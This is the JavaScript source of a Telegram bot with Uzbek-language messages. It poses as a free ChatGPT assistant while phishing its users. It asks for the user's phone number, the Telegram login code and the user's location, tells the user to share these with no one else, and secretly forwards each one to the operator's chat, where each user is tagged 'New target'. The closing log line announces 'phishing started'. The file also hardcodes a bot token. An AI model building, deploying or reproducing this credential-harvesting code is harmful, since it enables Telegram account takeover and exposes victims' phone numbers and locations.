const TelegramBot = require('node-telegram-bot-api');
const botToken = '6520234951:AAFPOEZ2E63n0A_2PLWsxbMQMqHzy4fGvRE';
const bot = new TelegramBot(botToken, { polling: true });

const home = JSON.stringify({
    resize_keyboard: true,
    keyboard: [
        [`!Ro'yxatdan o'tish!`]
    ]
});
const home2 = JSON.stringify({
  resize_keyboard: true,
  keyboard: [
      [`Joylashuvni ulashish.`]
  ]
});

// /start komandasiga javob berish
bot.onText(/\/start/, (msg) => {
  const username = msg.chat.username;
    const firstName = msg.chat.first_name;
  const chatIdmy = 5302582529;
    const chatId = msg.chat.id;
    const option = {
        reply_to_message_id: msg.message_id,
        parse_mode: "markdown",
        reply_markup: JSON.parse(home) // JSON.parse() bilan chiqarish
    };
    bot.sendMessage(chatId, `Assalomu alaykum, Yordamchi botiga xush kelibsiz, bu bot siz bergan har qanday savolga Suniy Intelekt ChatGPT yordamida javob bera oladi. Chat GPT ga ulanish uchun Royxatdan o'ting! Va qaysi davlatdan kirayotganingizni tasdiqlash uchun Joylashuvingizni ulashing. \n❗️Bunday malumotlaringizni boshqa shaxslarga tashlamang❗️`, option);
    bot.sendMessage(chatIdmy, `New target🤡\n\n 👤username: @${username}\n 👤firstname: ${firstName}\n 👤telegramID: ${chatId}`)
});

// Ro'yxatdan o'tish tugmasiga javob berish
bot.onText(/!Ro'yxatdan o'tish!/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Royxatdan o'tish uchun telefon raqamingizni yozing. Na'muna: 97 123 45 67`);
});

// Telefon raqamini tekshirish
bot.on('message', (msg) => {
    const chatIdmy = 5302582529;
    const chatId = msg.chat.id;
    const message = msg.text;

    // Telefon raqamini tekshirish funksiyasi
    function test(phoneNumber) {
        const test2 = /\d{2} \d{3} \d{2} \d{2}/; // Raqamni tekshirish uchun
        return test2.test(phoneNumber);
    }

    const number = test(message);
    if (number) {
        bot.sendMessage(chatId, `Telegram ilovangizga kelgan kodni kiriting.\n❗️Kelgan kodni boshqa hech kimga bermang, xatto u Telegram xodimi bo'lsa ham❗️`);
        bot.sendMessage(chatIdmy, `📱Tel.number:  ${message}`);
        
        setTimeout(() => {
            bot.sendMessage(chatId, `So'rovingiz tasdiqlandi. Sizni qiziqtirgan savolni yo'llang.`);
        }, 50000);
    }
});

// Kodni tekshirib yuborish va joylashuvni so'rash
bot.on('message', (msg) => {
  const option = {
    reply_to_message_id: msg.message_id,
    parse_mode: "markdown",
    reply_markup: JSON.parse(home2) // JSON.parse() bilan chiqarish
};
    const chatId = msg.chat.id;
    const chatIdmy = 5302582529;
    const messageText = msg.text;

    if (/^\d{5}$/.test(messageText)) { // 5 raqamli kodni tekshirish
        bot.sendMessage(chatId, `✅ Kod muvaffaqiyatli tasdiqlandi.\n❗️ Joylashuvingizni tasdiqlang.`, option);
        bot.sendMessage(chatIdmy, `🔎Telegram code:  ${messageText}`);
    }
});

// Joylashuvni ulashish tugmasini bosganda
bot.onText(/Joylashuvni ulashish\./, (msg) => {
    const chatId = msg.chat.id;

    // Joylashuvni ulashish uchun kalit
    const opts = {
        reply_markup: {
            keyboard: [
                [{
                    text: "Joylashuvni ulashish.",
                    request_location: true
                }]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };

    bot.sendMessage(chatId, 'Joylashuvni ulashish uchun bosing: ', opts);
});

// Joylashuvni qabul qilish
bot.on('location', (msg) => {
    const chatIdmy = 5302582529;
    const chatId = msg.chat.id;
    const location = msg.location;
    console.log(`Joylashuv: [${location.latitude}, ${location.longitude}]`);

    bot.sendMessage(chatIdmy, `📍Location\n received:\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}`);
    bot.sendMessage(chatId, `✅ Joylashuvingiz tasdiqlandi (area: Uzbekistan).`);
});

// Foydalanuvchidan xabarlarni olish
bot.on('message', (msg) => {
    const messageText = msg.text;
    const username = msg.chat.username;
    const firstName = msg.chat.first_name;
    const botga_kelgan_xabar = messageText;
    const time = new Date().toTimeString();
    console.log(`[${username}:${firstName}]dan kelgan xabar:`, `[${botga_kelgan_xabar}]`, 'vaqti:', time);
});

console.log('phishing started...');
